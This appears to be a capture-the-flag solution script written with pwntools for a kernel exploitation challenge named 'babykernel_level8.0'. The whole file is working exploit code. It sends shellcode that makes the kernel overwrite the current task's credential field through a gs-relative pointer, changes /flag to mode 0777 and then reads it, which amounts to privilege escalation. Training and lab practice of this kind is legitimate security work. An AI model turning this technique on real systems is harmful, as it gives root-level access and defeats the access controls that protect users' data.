#https://github.com/slavaim/linux-notes/blob/master/current_task.md
# use level8.c to gdb trace code
from pwn import *
import os
context.arch='amd64'
r = process('/challenge/babykernel_level8.0')

map_code = 0x31337000

#payload2 =  b'\x65\x48\x8b\x04\x25\x00\x5d\x01\x00'
#payload2 += b'\x48\x81\x20\xff\xfe\xff\xff\xc3'

payload2 = asm('''

     mov rax, QWORD PTR gs:0x15d00
     mov QWORD PTR [rax], 0
     ret
 ''')

payload = asm(f'''
    mov rax, 1
    mov rdi, 3
    mov rsi, {map_code+0x300}
    mov rdx, 0x100
    syscall

    mov rax, 90
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''').ljust(0x300,b'\x41') + payload2

r.send(payload)

os.system('cat /flag')
r.interactive()